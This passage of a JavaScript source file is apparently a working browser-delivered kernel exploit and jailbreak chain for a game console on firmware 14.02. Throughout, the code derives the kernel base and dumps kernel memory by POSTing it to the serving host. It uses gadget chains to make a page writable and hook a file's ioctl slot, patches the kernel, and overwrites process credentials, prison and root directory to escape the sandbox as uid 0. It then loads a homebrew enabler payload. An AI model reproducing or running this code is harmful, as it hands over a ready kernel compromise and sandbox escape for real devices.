               nothing in the file says where anything is loaded. The kernel is
               built without section headers (e_shoff = e_shnum = 0), so the
               sections were a dead end from the first byte -- but the loadable
               segments are still described, and they are what a scan needs. */
            const segs = [];
            if (phoff.lo && phnum >= 1 && phnum <= 32
                && phentsize >= 32 && phentsize <= 128) {
              const ph = kread(plus(kbase, phoff.lo),
                               Math.min(phnum * phentsize, 0x1000));
              for (let i = 0; i < phnum; i++) {
                const o = i * phentsize;
                const type = ph.dv.getUint32(o, true) >>> 0;
                const flags = ph.dv.getUint32(o + 4, true) >>> 0;
                const off = q64(ph.dv, o + 8);
                const vaddr = q64(ph.dv, o + 0x10);
                const filesz = q64(ph.dv, o + 0x20);
                const memsz = q64(ph.dv, o + 0x28);
                say("leak-only SEG     t=" + type + " f=" + flags
                    + " off=0x" + off.lo.toString(16)
                    + " va=0x" + vaddr.lo.toString(16)
                    + " fsz=0x" + filesz.lo.toString(16)
                    + " msz=0x" + memsz.lo.toString(16));
                if (type === 1 && filesz.lo
                    && (vaddr.lo >>> 0) >= (kbase.low >>> 0))
                  segs.push({ rva: ((vaddr.lo >>> 0) - (kbase.low >>> 0)) >>> 0,
                              len: filesz.lo, flags: flags });
              }
            } else {
              say("leak-only ELF     no program table either -- nothing to walk");
            }

            /* The kernel keeps an export table for loadable modules. If that
               table is in the image, the names it exports are in the image as
               plain C strings, and a string is enough to find the entry that
               points at the function. Scan every file-backed byte the segments
               describe and report where each wanted name sits. */
            const WANT = ["bcopy", "bzero", "memcpy", "pagezero", "pagecopy",
                          "copyin", "copyinstr", "copystr", "dlsym", "load_prx",
                          "prison0", "rootvnode", "kernbase", "kernel_pmap"];
            const hits = {};
            for (let w = 0; w < WANT.length; w++) hits[WANT[w]] = [];
            /* A kernel image is not one flat mapping. The segments sit where
               the linker put them, and a read that steps outside a mapped page
               takes the console down -- which is what an eight megabyte grab
               did. Start small, prove the range, grow only after a read comes
               back whole, and post the log before each one so the last line on
               the server names the read that killed it. */
            let CH = 0x10000;
            const chunkArg = (ctx.params && ctx.params.get("chunk")) || "";
            const chunkWant = parseInt(chunkArg, 10);
            if (chunkWant >= 0x1000 && chunkWant <= 0x100000) CH = chunkWant;
            /* 1 MiB is the proven ceiling. A 2 MiB grab was refused on every
               retry at two unrelated addresses, so it is the size that fails
               and not the range. */
            const MAXCH = 0x100000;
            const scanOn = !(ctx.params && ctx.params.get("scan") === "0");
            const dumpOn = !!(ctx.params && ctx.params.get("dump") === "1");
            const postLog = function () {
              try {
                if (typeof fetch === "function")
                  fetch("log", { method: "POST", body: LOGLINES.join("\n") });
              } catch (e) {}
            };
            /* The bytes, to a file. A kernel image cannot be obtained any
               other way on this firmware -- the PUP payload is encrypted and
               no 14.02 image exists -- so a working read is the only copy of
               the real machine code that will ever exist, and it has to be on
               a disk before the console reboots. */
            const postBytes = function (tag, rva, u8, n) {
              if (!dumpOn) return;
              try {
                if (typeof fetch === "function")
                  fetch("dump?seg=" + tag + "&rva=0x" + (rva >>> 0).toString(16),
                        { method: "POST", body: u8.slice(0, n) });
              } catch (e) {}
            };

            /* The version string is the one landmark that is guaranteed to be
               in the image. Names are optional on a stripped kernel and every
               name search can come back empty and prove nothing; the firmware
               string cannot. */
            const VNEEDLE = "14.02-HCX";

            /* Writable first: an export table lives in .data, and .data is the
               segment least likely to share pages with anything already read. */
            segs.sort(function (x, y) { return (y.flags & 2) - (x.flags & 2); });

            let scanned = 0, shots = 0, chunks = 0, vhits = 0;
            let lastOk = 0, stopped = false, targetEnd = 0;
            const BUDGET = 5;
            /* A run that dies part way is resumed by naming where it stopped:
               ?skip=<rva in hex> starts the scan there, so four partial runs
               cost the same as one that never finished. */
            const skipRva = parseInt((ctx.params && ctx.params.get("skip")) || "", 16) || 0;
            const segArg = (ctx.params && ctx.params.get("seg")) || "";
            for (let si = 0; si < segs.length && chunks < BUDGET && scanOn; si++) {
              const seg = segs[si];
              const segTag = (seg.flags & 2) ? "data" : "text";
              if (segArg && segArg !== segTag) continue;
              if (seg.rva + seg.len > targetEnd) targetEnd = seg.rva + seg.len;
              let start = 0;
              if (skipRva) {
                if (skipRva >= seg.rva + seg.len) continue;
                if (skipRva > seg.rva) start = skipRva - seg.rva;
              }
              say("leak-only seg     " + segTag + " rva=0x" + seg.rva.toString(16)
                  + " len=0x" + seg.len.toString(16)
                  + (start ? " from +0x" + start.toString(16) : ""));
              postLog();
              for (let off = start; off < seg.len && chunks < BUDGET; ) {
                const n = Math.min(CH, seg.len - off);
                if (n < 0x1000) break;
                say("leak-only read    +0x" + (seg.rva + off).toString(16)
                    + "  " + n + " bytes");
                postLog();
                let chunk = null;
                try {
                  chunk = kread(plus(kbase, (seg.rva + off) >>> 0), n);
                } catch (e) {
                  say("leak-only scan    " + (e && e.message ? e.message : String(e)));
                  postLog();
                  stopped = true;
                  break;                        /* next segment, keep what we have */
                }
                shots++;
                chunks++;
                scanned += n;
                lastOk = seg.rva + off + n;
                postBytes(segTag, (seg.rva + off) >>> 0, chunk.u8, n);
                /* Release the handles now. The 128 byte object was already
                   freed inside the window before take() returned, so the
                   kqueue's pending event is stale and closing it is safe.
                   Without this, four reads exhaust the descriptor table and
                   the fifth shot faults the kernel. */
                shot.drop();

                /* No in-page search. Iterating 1 MiB of bytes for fourteen
                   needles holds the main thread for hundreds of milliseconds
                   and the kernel loses the thread that holds the shot state.
                   Names are found offline, on the image this run is dumping. */
                off += n;
                postLog();
                if (CH < MAXCH) CH = Math.min(CH * 2, MAXCH);
              }
            }
            say("leak-only scan    " + (scanned / 1048576).toFixed(1)
                + " MiB in " + shots + " reads, " + vhits + " version hit(s)"
                + (dumpOn ? ", dumped" : ", not dumped"));

            /* A dump that stopped short reloads itself at the first byte it
               never read. The base is per boot, so the reload costs one
               derivation and nothing else -- and a 20 MiB image that needs
               four runs finishes without anyone watching it. The guard is
               that a run which dumped nothing must not reload, or a console
               that cannot read at all would spin forever. */
            const autoOn = !!(ctx.params && ctx.params.get("auto") === "1");
            if (autoOn && scanOn && stopped && chunks > 0 && lastOk && lastOk < targetEnd) {
              say("leak-only auto    resuming at +0x" + lastOk.toString(16));
              postLog();
              const nextUrl = "jb13.html?log=1&afterglow=leak&dump=1&seg="
                + (segArg || "text") + "&skip=0x" + lastOk.toString(16)
                + "&auto=1&v=30";
              setTimeout(function () {
                try { location.replace(nextUrl); } catch (e) {}
              }, 5000);
            }
            let anyName = 0;
            for (let w = 0; w < WANT.length; w++) {
              const t = WANT[w];
              if (!hits[t].length) continue;
              anyName++;
              say("leak-only STR     " + t + "  " + hits[t].map(function (x) {
                return "+0x" + x.toString(16);
              }).join(" "));
            }
            say("leak-only STR     " + (anyName
                ? anyName + " of " + WANT.length + " names present"
                : "no exported symbol names in the image"));
            if (!segs.length)
              say("leak-only ELF     no loadable segments -- nothing scanned");

            if (shoff.lo && shnum >= 4 && shnum <= 96) {
            const shBytes = Math.min(shentsize * shnum, 0x4000);
            const shTab = kread(plus(kbase, shoff.lo), shBytes);
            const sec = function (i) {
              const o = i * shentsize;
              return {
                name: shTab.dv.getUint32(o, true) >>> 0,
                type: shTab.dv.getUint32(o + 4, true) >>> 0,
                addr: q64(shTab.dv, o + 0x10),
                off: q64(shTab.dv, o + 0x18),
                size: q64(shTab.dv, o + 0x20),
                link: shTab.dv.getUint32(o + 0x28, true) >>> 0,
                entsize: q64(shTab.dv, o + 0x38),
              };
            };

            /* section name table */
            const si = (shstrndx < shnum) ? sec(shstrndx) : null;
            let strTab = null;
            if (si) strTab = kread(plus(kbase, si.off.lo), Math.min(si.size.lo, 0x2000));
            const shName = function (off) {
              if (!strTab || off >= Math.min(si.size.lo, 0x2000)) return "?";
              let s = "";
              for (let i = off; i < Math.min(si.size.lo, 0x2000); i++) {
                const b = strTab.u8[i];
                if (!b) break;
                s += String.fromCharCode(b);
              }
              return s || "?";
            };

            let symtab = null, strtab = null;
            const names = [];
            for (let i = 1; i < shnum && i < 64; i++) {
              const s = sec(i);
              const nm = shName(s.name);
              if (nm === ".symtab") symtab = s;
              else if (nm === ".strtab") strtab = s;
              if (names.length < 12) names.push(nm);
            }
            say("leak-only ELF     sections " + names.join(" "));
            if (!symtab || !strtab) {
              say("leak-only ELF     no .symtab/.strtab -- symbols are stripped");
            } else {
              say("leak-only ELF     symtab off=" + hex32(symtab.off.lo)
                  + " size=" + hex32(symtab.size.lo)
                  + " strtab size=" + hex32(strtab.size.lo));

              /* read the string table, then find where each wanted name sits
                 in it -- a symbol's st_name is an index into exactly this */
              const strSize = Math.min(strtab.size.lo, 0x20000);
              const st = kread(plus(kbase, strtab.off.lo), strSize);
              const WANT = ["bcopy", "bzero", "memcpy", "pagezero", "pagecopy",
                            "copyin", "copyinstr", "copystr", "dlsym", "load_prx",
                            "prison0", "rootvnode", "kernbase", "kernel_pmap"];
              const idx = {};
              for (let w = 0; w < WANT.length; w++) {
                const t = WANT[w];
                for (let i = 0; i + t.length < strSize; i++) {
                  let ok = true;
                  for (let k = 0; k < t.length; k++) {
                    if (st.u8[i + k] !== t.charCodeAt(k)) { ok = false; break; }
                  }
                  if (!ok) continue;
                  if (i > 0 && st.u8[i - 1] !== 0) continue;   /* not a name start */
                  if (st.u8[i + t.length] !== 0) continue;      /* not a name end */
                  if (idx[t] === undefined) idx[t] = i;
                }
              }

              /* walk the symbol table in windows; each entry is 24 bytes and
                 st_name is the first word */
              const ents = symtab.entsize.lo || 24;
              const total = Math.floor(symtab.size.lo / ents);
              const CH = 0x2000;
              const per = Math.floor(CH / ents);
              const found = {};
              for (let base_i = 0; base_i < total && base_i < 512 * per; base_i += per) {
                const n = Math.min(per, total - base_i);
                const chunk = kread(plus(kbase, (symtab.off.lo + base_i * ents) >>> 0), n * ents);
                for (let i = 0; i < n; i++) {
                  const o = i * ents;
                  const sn = chunk.dv.getUint32(o, true) >>> 0;
                  for (let w = 0; w < WANT.length; w++) {
                    const t = WANT[w];
                    if (idx[t] !== undefined && idx[t] === sn && found[t] === undefined) {
                      const val = q64(chunk.dv, o + 8);
                      if (val.hi === kbase.hi) found[t] = (val.lo - kbase.lo) >>> 0;
                    }
                  }
                }
              }
              const lines = [];
              for (let w = 0; w < WANT.length; w++) {
                const t = WANT[w];
                if (found[t] !== undefined)
                  lines.push(t + "=0x" + found[t].toString(16));
              }
              say("leak-only SYMS    " + (lines.length ? lines.join(" ") : "none matched"));
            }
            }
          } catch (e) {
            say("leak-only ELF     threw: " + String((e && e.message) || e));
          }
        } else if (kernely) {
          say("leak-only prison0   no ELF at the base -- not the image start");
        }
      } else {
        say("leak-only head    unreadable after " + headTries + " tries");
        /* The base survives in STATE, so the next attempt skips the leak
           entirely and spends every shot it has on the header instead of
           splitting them between deriving and reading. Four attempts of six
           shots each is a far better bet than four shots once. The log is
           still posted -- a failed attempt is the only thing that says why. */
        STATE.retry = true;
      }
    }
    say("leak-only nothing was written");

    /* Hand the log back to the server. The console's screen is 1080p and the
       interesting values are eight hex digits wide; a photograph of that is
       a guess. A POST is exact. Best effort -- a failure here changes nothing
       about the run. */
    try {
      if (typeof fetch === "function") {
        fetch("log", { method: "POST", body: LOGLINES.join("\n") });
      }
    } catch (e) {}

    return !STATE.retry;
  }

  const kat = function (rva) { return plus(kbase, rva); };

  /* ---- handles and mappings, in one chain ------------------------------ */

  let probe = -1, node = null;
  for (let i = 0; i < PROBE_NODES.length && probe < 0; i++) {
    probe = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (probe >= 0) node = PROBE_NODES[i];
  }
  if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }

  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(hostFree, off)) !== 0) {
      say("[2] the spare room behind libc is occupied -- nothing written");
      return false;
    }
  }
  say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
      + " bytes of spare room behind libc");

  /* How far the kernel side has to be walked. The listing already told us
     where the host page sits; one entry of slack, and never more than the
     table we allocated for. */
  let reach = TUNE.entries;
  if (MAPS) {
    for (let i = 0; i < MAPS.length; i++) {
      const a0 = MAPS[i][0], b0 = MAPS[i][1];
      const above = a0.hi < hostPage.hi || (a0.hi === hostPage.hi && a0.low <= hostPage.low);
      const below = hostPage.hi < b0.hi || (hostPage.hi === b0.hi && hostPage.low < b0.low);
      if (above && below) { reach = Math.min(TUNE.entries, i + 2); break; }
    }
  }
  say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
      + (MAPS ? (", " + MAPS.length + " mapped") : ""));

  const note = alloc(128), ftab = alloc(0x100);
  const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
  wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);

  /* Four shots or three: the walk through the mapping list can ride along
     with the handle chain or cost a shot of its own. Separate is the form
     that has evidence behind it; merged is one shot fewer, and so one more
     chance of the hole being won by something else. */
  const merged = ((ctx.params && ctx.params.get("shots")) || "4") === "3";

  const walkLoop = function (c) {
    for (let k = 0; k < reach; k++) {
      const src = c.grab(plus(maps.at, k * TUNE.stride), TUNE.stride);
      c.load_rax(c.where(src));
      c.gad("load8");
    }
  };

  const r2 = shot.take(function (c) {
    c.slot(kat(K.swap_rbp));
    c.save_rax(note.at);
    c.slot(kat(K.swap_rbp));
    c.load_rax(note.at);
    c.follow(0);
    c.follow(-0x148);                 /* thread */
    c.save_rax(plus(note.at, 8));
    c.gad("load8");                   /* process */
    c.save_rax(plus(note.at, 16));
    c.follow(0x48);                   /* descriptor table */
    c.follow(0);                      /* open file array */
    c.follow(probe * 8);              /* our file */
    c.save_rax(plus(note.at, 40));
    c.gad("load8");                   /* its operation table */
    c.save_rax(plus(note.at, 48));
    c.grab(ftab.at, 0x58);

    if (merged) {
      c.load_rax(plus(note.at, 16));  /* process again, memcpy clobbered rax */
      c.follow(0x168);                /* address space */
      c.gad("load8");                 /* first mapping */
      walkLoop(c);
    }
  }, merged ? 0x1000 + reach * 0x100 : 0x1000);

  const file = qAt(note, 40), ops = qAt(note, 48);
  say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
  if (!inHeap(file) || !inText(ops)) {
    say("    handles implausible -- nothing written"); STATE.retry = true; return false;
  }

  let sane = 0;
  for (let k = 0; k < 10; k++) if (inText(qAt(ftab, k * 8))) sane++;
  if (sane < 6) { say("    operation table unusable, " + sane + " of 10"); return false; }

  let r2b = -1;
  if (!merged) {
    r2b = shot.take(function (c) {
      c.slot(kat(K.swap_rbp));
      c.save_rax(note.at);
      c.slot(kat(K.swap_rbp));
      c.load_rax(note.at);
      c.follow(0);
      c.follow(-0x148);               /* thread */
      c.gad("load8");                 /* process */
      c.follow(0x168);                /* address space */
      c.gad("load8");                 /* first mapping */
      walkLoop(c);
    }, 0x1000 + reach * 0x100);
    say("[3b] address space walked, chain="
        + (r2b === null ? ("null -- " + shot.why) : r2b));
    if (!ran(r2b)) {
      say("    the chain did not run -- the hole was refilled with a real object");
      STATE.retry = true;
      return false;
    }
  }

  /* ---- the mapping that covers the host page --------------------------- */

  let hit = null, walked = 0;
  for (let k = 0; k < reach; k++) {
    const from = qAt(maps, k * TUNE.stride + 0x20);
    const upto = qAt(maps, k * TUNE.stride + 0x28);
    if (from.low === 0 && from.hi === 0 && upto.low === 0 && upto.hi === 0) break;
    /* the list is circular and its head spans the whole address space, so it
       matches everything. Anything wider than a terabyte is that head. */
    if (upto.hi - from.hi > 0x100) break;
    walked = k + 1;
    const above = from.hi < hostPage.hi || (from.hi === hostPage.hi && from.low <= hostPage.low);
    const below = hostPage.hi < upto.hi || (hostPage.hi === upto.hi && hostPage.low < upto.low);
    if (above && below) { hit = k; break; }
  }
  if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }
  /* the address of entry k is the forward pointer of entry k-1, so the first
     entry has nothing to take it from */
  if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }

  const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
  const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
  const here = qAt(maps, (hit - 1) * TUNE.stride + 0x08);
  const now = rights % 256, ceiling = Math.floor(rights / 256) % 256;

  say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
      + " ceiling=0x" + ceiling.toString(16));
  if (locked % 2 === 1 || !inHeap(here) || now === 0 || ceiling === 0
      || Math.floor(now / 4) % 2 !== 1) {
    say("    not the mapping we want -- nothing written"); return false;
  }

  /* ---- widen it, take over the file, run the bootstrap ----------------- */

  /* the page already reads and executes; all it lacks is write. Touching the
     execute bit here is what broke every earlier attempt. */
  let widened = rights;
  if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;

  const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
  const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
  pokeAt(ftab, 0x18, hostFree);                      /* the ioctl slot */

  const r3 = shot.take(function (c) {
    c.put(plus(here, 0x5c), wRights.at, 4);
    c.put(plus(file, 0x08), wTable.at, 8);
  });
  say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
  if (!ran(r3)) { say("    chain did not run -- kernel untouched"); STATE.retry = true; return false; }

  if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
    say("    page did not turn writable -- not calling into it"); return false;
  }
  const boot = unhex(BOOTSTRAP);
  wrbuf(hostFree, boot);
  if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
    say("    bootstrap did not stick"); return false;
  }

  const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const before = sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32;
  sc(S.ioctl, probe, 0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at);
  const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const after = sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32;

  /* The file has to go back before anything closes it, or fo_close walks into
     the forged table. The gate is planted by now, so that one word need not
     cost another trigger: each trigger is a chance for a foreign allocation
     to win the hole, and the pivot then loads a stack pointer out of someone
     else's object. The trigger stays as the fallback -- when the bootstrap
     did not run, there is no gate to write through. */
  const k = openRing0(hostFree);
  const thread = (before !== 0 && after === 0) ? k.thread() : null;
  const gated = thread !== null && inHeap(thread);

  if (!(gated && k.write_v(plus(file, 0x08), ops))) {
    const wOld = alloc(16); pokeAt(wOld, 0, ops);
    shot.take(function (c) { c.put(plus(file, 0x08), wOld.at, 8); });
  }
  sc(S.close, probe);

  if (before === 0 || after !== 0) {
    say("[6] kernel unchanged, rwx " + before + " before and " + after + " after -- "
        + shot.fired + " shots used");
    return false;
  }
  say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");

  /* ---- everything from here runs through the gate ---------------------- */

  if (!gated) { say("[7] the gate did not answer"); return false; }
  const base2 = k.base();
  if (!base2 || !same(base2, kbase)) {
    say("[7] the gate reports " + (base2 ? text(base2) : "nothing")
        + ", the leak said " + text(kbase));
    return false;
  }
  say("[7] gate is live, thread " + text(thread));

  /* From here the kernel is open AND the handles are armed. Any abort
     between here and [10] used to leave them that way. The next process exit
     then ends every fo_close in apmclose -> destroy_dev_sched, the exit never
     completes, and the browser cannot even be restarted -- closing it IS that
     exit. Only a console restart recovers from it. `ofs` hangs off `thread`
     alone, so it can be derived here. */
  const failOut = function (why) {
    say(why);
    try {
      const p0 = k.read_v(plus(thread, 0x08));
      const f0 = p0 && k.read_v(plus(p0, 0x48));
      const o0 = f0 && k.read_v(f0);
      if (o0 && inHeap(o0)
          && teardown(k, kbase, o0, shot.devs, shot.queues, hostFree))
        say("handles defused after the failure -- this page may close");
      else
        say("the handles are NOT defused -- do not close this page, cold boot instead");
    } catch (e) {
      say("teardown threw: " + ((e && e.message) || e));
    }
    return false;
  };

  if (!k.apply(kbase, PATCHES)) { return failOut("[8] the patch pass did not return"); }
  let done = 0, failed = null;
  for (let i = 0; i < PATCHES.length; i++) {
    const bytes = unhex(PATCHES[i][1]);
    const got = k.read(kat(PATCHES[i][0]), bytes.length);
    if (got && sameBytes(got, bytes)) done++; else failed = failed || PATCHES[i][2];
  }
  say("[8] " + done + " of " + PATCHES.length + " kernel patches in place"
      + (failed ? (" -- first missing: " + failed) : ""));
  if (done < PATCHES.length) { return failOut("     refusing to go on with a half patched kernel"); }

  const proc = k.read_v(plus(thread, 0x08));
  const fdt = proc && k.read_v(plus(proc, 0x48));
  const ofs = fdt && k.read_v(fdt);
  if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }

  /* ---- out of the sandbox --------------------------------------------- */

  const ucred = proc && k.read_v(plus(proc, 0x40));
  if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }

  const z4 = new Uint8Array([0, 0, 0, 0]);
  const offs = [0x04, 0x08, 0x0c, 0x14];
  for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));   /* cr_ngroups */

  const prison0 = k.read_v(kat(K.prison0));
  if (!prison0 || !inText(prison0)) {
    return failOut(
      "[9] prison0 pointer is " + (prison0 ? text(prison0) : "unreadable")
        + " -- not touching credentials",
    );
  }
  k.write_v(plus(ucred, 0x30), prison0);                      /* cr_prison */
  const caps = new Uint8Array(16); caps.fill(0xff);
  k.write(plus(ucred, 0x60), caps);

  const rootvnode = k.read_v(kat(K.rootvnode));
  if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
  k.write_v(plus(fdt, 0x10), rootvnode);                      /* fd_rdir */
  k.write_v(plus(fdt, 0x18), rootvnode);                      /* fd_jdir */

  if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
  say("[9] jailbroken, uid 0");

  /* ---- hand the host its kernel interface ------------------------------ */

  const iface = {
    base: kbase,
    curproc: proc,
    curproc_fd: fdt,
    curproc_ofiles: ofs,
    thread: thread,
    read: function (at, len) {
      const out = new Uint8Array(len);
      let got = 0;
      while (got < len) {
        const n = Math.min(len - got, STAGE_MAX);
        const s = k.read(plus(at, got), n);
        if (!s) return null;
        out.set(s, got); got += n;
      }
      return out;
    },
    write: function (at, bytes) {
      let done2 = 0;
      while (done2 < bytes.length) {
        const n = Math.min(bytes.length - done2, STAGE_MAX);
        if (!k.write(plus(at, done2), bytes.subarray(done2, done2 + n))) return false;
        done2 += n;
      }
      return true;
    },
    read8: function (at) { return k.read_v(at); },
    write8: function (at, q) { return k.write_v(at, q); },
    /* On this platform the loader tables are text relative -- the PS4 row
       carries PRISON0 0x111fa18 and ROOTVNODE 0x2136e90, the same values used
       above against this base -- so data_base holds it too. */
    data_base: kbase,
  };

  /* Every attempt leaves device handles and a queue behind. Closing them now
     kills the console, and leaving them kills it when the process exits.
     release_handles does neither; it has to run before anything closes. */
  iface.devs = shot.devs;
  iface.queues = shot.queues;
  if (ctx.state) ctx.state.afterglow = iface;

  say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");

  /* straight away, not on request: in this host the process can die at any
     moment and that is the moment this prevents */
  iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
  say(iface.defused
      ? "handles defused -- this page may close"
      : "the handles are NOT defused -- do not let this page close");

  const asked = (ctx.params && ctx.params.get("payload"));
  /* The enabler patches kernel code at its own fixed RVAs, so it is per
     firmware like everything else in this file. nova.bin and hen.bin are the
     14.00 builds and must never run on 14.02 -- their patch lists name 14.00
     functions, which on this kernel are other code. 14.02 gets hen1402.bin:
     the supplied HEN 2.2.0 build, whose own firmware gate accepts 474..1402,
     whose kernel stage carries a 0x57a branch, and whose 14.02 offset values
     are identical to this file's table. Anything else named explicitly is
     passed through untouched -- the landing page always says nova.bin, so the
     swap happens here, at the only point that knows which firmware the leak
     confirmed. */
  const want =
    FW_KEY === "14.02" && (asked === "nova.bin" || asked === "hen.bin")
      ? "hen1402.bin"
      : asked;
  const mode = (ctx.params && ctx.params.get("mode")) || "";
  if (want !== "") {
    iface.payload = (mode === "goldhen")
      ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
      : await loadPayload(want || "nova.bin");
  }
  say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"
      + (iface.payload ? ", enabler running" : ""));
  return iface;
}

/* An attempt that fell short leaves its handles live, and those are only
   defused once step 10 is reached -- so stopping on a recoverable miss is the
   worst of both: nothing gained, and a process that hangs when the page goes
   away. The kernel base survives in STATE, so a second attempt skips the leak
   and costs only triggers. A spent budget, or anything that already touched
   the kernel, is not retried. */
export async function runAfterglow(ctx, opts) {
  /* Every address below is firmware specific. Without a table for this one
     the chain would write 14.00 offsets into a different kernel.
     leakOnly stops after the base is derived and verified, before the first
     kernel write, so it may select a firmware that has no patch set. */
  const leakOnly = !!(opts && opts.leakOnly);
  if (!setFirmware(ctx.fw, { probeOnly: leakOnly, anchor: opts && opts.anchor })) {
    ctx.mark("AG", "no kernel stage for firmware " + ctx.fw + " -- refusing");
    return false;
  }
  const max = (opts && opts.tries) || 4;
  for (let n = 1; n <= max; n++) {
    const r = await attempt(ctx, opts);
    if (r) return r;
    if (!STATE.retry) return false;
    if (n === max) { say("gave up after " + n + " attempts"); return false; }
    say("attempt " + n + " fell short -- going again");
    await new Promise(function (ok) { setTimeout(ok, 400); });
  }
  return false;
}
